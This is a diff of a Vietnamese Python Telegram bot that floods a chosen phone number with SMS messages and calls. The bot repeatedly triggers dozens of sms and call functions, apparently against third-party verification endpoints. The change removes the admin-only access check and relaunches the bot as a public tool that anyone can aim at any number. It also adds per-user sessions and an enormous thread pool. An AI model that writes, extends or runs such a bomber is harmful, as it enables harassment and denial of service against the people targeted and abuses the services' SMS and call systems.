@@ -1,4 +1,4 @@
-# bot.py - Telegram Bot cho spam SMS/CALL
+# bot.py - Telegram Bot spam SMS/CALL - Public version
 # Yêu cầu: Python 3.9+, thư viện: python-telegram-bot==20.7, requests, pystyle, bs4
 
 import os
@@ -6,11 +6,8 @@ import re
 import time
 import random
 import string
-import hashlib
-import urllib.parse
 import json
 import requests
-import sys
 from bs4 import BeautifulSoup
 from concurrent.futures import ThreadPoolExecutor
 from pystyle import Col, Colors
@@ -25,7 +22,6 @@ load_dotenv()
 
 # === CẤU HÌNH BOT ===
 TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
-ADMIN_ID = int(os.getenv("ADMIN_ID", "123456789"))  # ID Telegram admin
 MAX_THREADS = 10000000
 threading = ThreadPoolExecutor(max_workers=MAX_THREADS)
 
@@ -34,6 +30,7 @@ thanhcong = 0
 thatbai = 0
 phone_target = ""
 running = False
+user_sessions = {}  # Lưu trạng thái theo user_id
 
 # === HÀM TIỆN ÍCH ===
 def generate_random_string(length):
@@ -48,7 +45,7 @@ def Random_string(length, minh=None):
 def random_string(length):
     return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))
 
-# === HÀM SPAM SMS ===
+# === HÀM SPAM SMS (GIỮ NGUYÊN) ===
 def sms0(phone):
     global thanhcong
     cookies = {'csrftoken': 'jxZ3X9GCAyb74yxGzBAEtd8Ke1TAXESU9qpypmmi6jAkrNC2lOo3vepbv5q29aU7', 'tel': phone}
@@ -612,18 +609,27 @@ def call6(phone):
         pass
 
 # === HÀM SPAM CHÍNH ===
-def spam_attack(phone, num_cycles=1):
-    global thanhcong, thatbai, running
+async def spam_attack_async(phone, user_id, context):
+    global running, thanhcong, thatbai
     thanhcong = 0
     thatbai = 0
     running = True
     
+    # Khởi tạo session cho user
+    if user_id not in user_sessions:
+        user_sessions[user_id] = {'running': False, 'thanhcong': 0, 'thatbai': 0}
+    
+    user_sessions[user_id]['running'] = True
+    user_sessions[user_id]['thanhcong'] = 0
+    user_sessions[user_id]['thatbai'] = 0
+    
+    num_cycles = 1
     for cycle in range(num_cycles):
-        if not running:
+        if not user_sessions[user_id]['running']:
             break
-            
+        
         # SMS functions
-        sms_functions = [
+        sms_funcs = [
             sms0, sms1, sms2, sms3, sms4, sms5, sms7, sms8, sms9, sms10,
             sms11, sms12, sms13, sms14, sms15, sms17, sms18, sms19, sms20,
             sms21, sms22, sms23, sms24, sms25, sms26, sms27, sms28, sms29,
@@ -631,42 +637,47 @@ def spam_attack(phone, num_cycles=1):
             sms39, sms40, sms41, sms42, sms43, sms44
         ]
         
-        for func in sms_functions:
-            if not running:
+        for func in sms_funcs:
+            if not user_sessions[user_id]['running']:
                 break
             try:
                 func(phone)
-                time.sleep(0.5)
+                thanhcong += 1
+                user_sessions[user_id]['thanhcong'] = thanhcong
+                await asyncio.sleep(0.3)
             except:
                 thatbai += 1
+                user_sessions[user_id]['thatbai'] = thatbai
         
-        time.sleep(2)
-        
-        if not running:
+        if not user_sessions[user_id]['running']:
             break
             
         # Call functions
-        call_functions = [call2, call3, call4, call5, call6]
-        for func in call_functions:
-            if not running:
+        call_funcs = [call2, call3, call4, call5, call6]
+        for func in call_funcs:
+            if not user_sessions[user_id]['running']:
                 break
             try:
                 func(phone)
-                time.sleep(1)
+                thanhcong += 1
+                user_sessions[user_id]['thanhcong'] = thanhcong
+                await asyncio.sleep(1)
             except:
                 thatbai += 1
+                user_sessions[user_id]['thatbai'] = thatbai
         
-        time.sleep(3)
+        if not user_sessions[user_id]['running']:
+            break
+            
+        await asyncio.sleep(2)
     
+    user_sessions[user_id]['running'] = False
     running = False
     return thanhcong, thatbai
 
 # === TELEGRAM BOT HANDLERS ===
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-    if user_id != ADMIN_ID:
-        await update.message.reply_text("❌ Bạn không có quyền sử dụng bot này.")
-        return
     
     keyboard = [
         [InlineKeyboardButton("▶️ Bắt đầu spam", callback_data="start_spam")],
@@ -677,7 +688,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "🤖 *Bot Spam SMS/CALL Việt Nam*\n\n"
         "Sử dụng các nút bên dưới để điều khiển.\n"
-        f"Admin ID: {ADMIN_ID}",
+        "⚠️ Bot công khai - Ai cũng có thể sử dụng.",
         reply_markup=reply_markup,
         parse_mode="Markdown"
     )
@@ -687,40 +698,33 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.answer()
     user_id = update.effective_user.id
     
-    if user_id != ADMIN_ID:
-        await query.edit_message_text("❌ Bạn không có quyền.")
-        return
-    
     if query.data == "start_spam":
-        if context.user_data.get('running', False):
-            await query.edit_message_text("⚠️ Đang chạy spam. Vui lòng dừng trước khi bắt đầu mới.")
+        if user_sessions.get(user_id, {}).get('running', False):
+            await query.edit_message_text("⚠️ Bạn đang chạy spam. Vui lòng dừng trước khi bắt đầu mới.")
             return
         
         await query.edit_message_text("📱 Nhập số điện thoại cần spam (VD: 0987654321):")
         context.user_data['awaiting_phone'] = True
         
     elif query.data == "stop_spam":
-        global running
-        running = False
-        context.user_data['running'] = False
-        await query.edit_message_text("⏹️ Đã dừng spam.")
+        if user_id in user_sessions:
+            user_sessions[user_id]['running'] = False
+        await query.edit_message_text("⏹️ Đã dừng spam cho bạn.")
         
     elif query.data == "status":
+        session = user_sessions.get(user_id, {})
         status_text = (
-            f"📊 *Trạng thái*\n"
+            f"📊 *Trạng thái của bạn*\n"
             f"─" * 20 + "\n"
-            f"🔹 Đang chạy: {'✅' if context.user_data.get('running', False) else '❌'}\n"
-            f"🔹 Thành công: {context.user_data.get('thanhcong', 0)}\n"
-            f"🔹 Thất bại: {context.user_data.get('thatbai', 0)}\n"
-            f"🔹 Tổng: {context.user_data.get('thanhcong', 0) + context.user_data.get('thatbai', 0)}"
+            f"🔹 Đang chạy: {'✅' if session.get('running', False) else '❌'}\n"
+            f"🔹 Thành công: {session.get('thanhcong', 0)}\n"
+            f"🔹 Thất bại: {session.get('thatbai', 0)}\n"
+            f"🔹 Tổng: {session.get('thanhcong', 0) + session.get('thatbai', 0)}"
         )
         await query.edit_message_text(status_text, parse_mode="Markdown")
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-    if user_id != ADMIN_ID:
-        await update.message.reply_text("❌ Bạn không có quyền.")
-        return
     
     if context.user_data.get('awaiting_phone', False):
         phone = update.message.text.strip()
@@ -731,7 +735,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         context.user_data['awaiting_phone'] = False
         context.user_data['phone_target'] = phone
-        context.user_data['running'] = True
         
         await update.message.reply_text(
             f"✅ Đã nhận số: {phone}\n"
@@ -741,10 +744,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         # Chạy spam trong background
         try:
-            success, fail = await spam_attack_async(phone, context)
-            context.user_data['thanhcong'] = success
-            context.user_data['thatbai'] = fail
-            context.user_data['running'] = False
+            success, fail = await spam_attack_async(phone, user_id, context)
             
             await update.message.reply_text(
                 f"✅ *Hoàn thành spam*\n"
@@ -757,65 +757,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
         except Exception as e:
             await update.message.reply_text(f"❌ Lỗi: {str(e)}")
-            context.user_data['running'] = False
-
-async def spam_attack_async(phone, context):
-    global running
-    thanhcong = 0
-    thatbai = 0
-    running = True
-    
-    # Chạy spam tuần tự với số lần lặp
-    num_cycles = 1
-    for cycle in range(num_cycles):
-        if not running:
-            break
-        
-        # Danh sách hàm SMS
-        sms_funcs = [
-            sms0, sms1, sms2, sms3, sms4, sms5, sms7, sms8, sms9, sms10,
-            sms11, sms12, sms13, sms14, sms15, sms17, sms18, sms19, sms20,
-            sms21, sms22, sms23, sms24, sms25, sms26, sms27, sms28, sms29,
-            sms30, sms31, sms32, sms33, sms34, sms35, sms36, sms37, sms38,
-            sms39, sms40, sms41, sms42, sms43, sms44
-        ]
-        
-        for func in sms_funcs:
-            if not running:
-                break
-            try:
-                func(phone)
-                thanhcong += 1
-                context.user_data['thanhcong'] = thanhcong
-                await asyncio.sleep(0.3)
-            except Exception as e:
-                thatbai += 1
-                context.user_data['thatbai'] = thatbai
-        
-        if not running:
-            break
-            
-        # Call functions
-        call_funcs = [call2, call3, call4, call5, call6]
-        for func in call_funcs:
-            if not running:
-                break
-            try:
-                func(phone)
-                thanhcong += 1
-                context.user_data['thanhcong'] = thanhcong
-                await asyncio.sleep(1)
-            except:
-                thatbai += 1
-                context.user_data['thatbai'] = thatbai
-        
-        if not running:
-            break
-            
-        await asyncio.sleep(2)
-    
-    running = False
-    return thanhcong, thatbai
 
 # === MAIN ===
 import asyncio
@@ -830,9 +771,8 @@ def main():
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     
     # Chạy bot
-    print("🤖 Bot đang chạy...")
+    print("🤖 Bot đang chạy... (Public - Ai cũng dùng được)")
     print(f"🔑 Token: {TOKEN[:10]}...")
-    print(f"👤 Admin ID: {ADMIN_ID}")
     application.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == "__main__":
